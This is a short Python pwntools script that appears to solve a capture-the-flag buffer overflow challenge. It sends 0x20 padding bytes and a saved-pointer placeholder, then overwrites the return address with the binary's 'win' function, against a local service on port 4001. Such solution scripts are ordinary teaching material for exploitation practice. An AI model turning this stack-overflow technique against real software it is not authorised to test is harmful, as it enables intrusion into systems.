import pwn

HOST = 'localhost'
PORT = 4001

pwn.context.arch = 'x86-64'
addr = {}

elf = pwn.ELF('./chall_bof.elf')

addr['win'] = elf.symbols['win'] + 0x5

def exploit():
    io = pwn.remote(port=PORT,host=HOST)

    recv = io.recv(1024)

    print(f"recv = {recv.decode()}")

    payload = pwn.flat(
        b'\x00' * 0x20,
        pwn.pack(0),
        pwn.pack(addr['win']),
        b'\n'
    )

    io.send(payload)
    print(f'payload = {payload}')

    recv = io.recvrepeat(5)
    print(f"recv = {recv.decode()}")

    io.close()


    print(f"win addr = {hex(addr['win'])}")

if(__name__=='__main__'):
    exploit()